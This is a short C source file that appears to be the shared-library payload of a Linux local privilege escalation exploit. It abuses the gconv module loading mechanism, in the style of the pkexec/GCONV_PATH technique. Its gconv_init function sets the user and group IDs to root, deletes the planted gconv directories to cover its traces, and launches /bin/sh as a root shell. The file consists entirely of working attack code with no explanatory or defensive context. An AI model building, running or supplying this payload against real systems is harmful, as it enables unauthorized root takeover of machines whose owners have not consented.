#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
// build with gcc payload.c -o payload.so -shared -fPIC

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    char* argv[] = { "/bin/sh", NULL };
    char* envp[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    system("rm -r gconv");
    system("rm -r \"GCONV_PATH=.\"");
    fprintf(stdout, "Spawning root shell!\n");
    if (execve("/bin/sh", argv, envp) == -1)
       perror("Could not execve :( ");
}
